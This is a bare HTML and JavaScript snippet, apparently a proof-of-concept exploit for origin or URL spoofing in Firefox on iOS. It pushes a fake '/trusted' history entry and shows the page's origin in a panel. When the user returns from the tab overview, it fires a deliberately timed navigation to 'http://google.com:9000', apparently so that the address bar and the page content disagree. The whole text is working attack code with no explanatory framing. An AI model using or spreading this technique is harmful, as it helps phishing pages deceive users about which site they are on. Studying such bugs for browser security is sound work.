<script>
const panel = document.getElementById('panel');
const originLabel = document.getElementById('origin');
const startBtn = document.getElementById('start');

let armed = false;

startBtn.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
  originLabel.textContent = location.origin;
  armed = true;
};

/*
 Firefox iOS:
 tab overview return = pageshow + persisted
*/
window.addEventListener('pageshow', (e) => {
  if (!armed) return;

  // update visible content immediately
  originLabel.textContent = location.origin;

  // DELAYED NAVIGATION (critical)
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'http://google.com:9000';
      }, 80);
    });
  });
});
</script>
